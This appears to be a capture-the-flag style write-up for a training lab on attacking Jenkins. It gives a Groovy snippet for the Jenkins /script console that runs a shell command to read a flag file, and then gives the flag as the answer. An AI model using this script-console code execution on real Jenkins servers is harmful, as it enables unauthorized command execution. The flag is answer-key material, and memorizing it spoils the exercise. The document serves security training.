# Section 12: Attacking Jenkins

Module: 24. Attacking Common Applications

---

## Questions & Answers

### 1. Attack the Jenkins target and gain remote code execution. Submit the contents of the flag.txt file in the /var/lib/jenkins3 directory

Context:
- Run this script in `/script` to get the flag:
```
def cmd = 'cat /var/lib/jenkins3/flag.txt'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

**Answer:** `f33ling_gr00000vy!`

---

[Back to Module Index](./README.md)
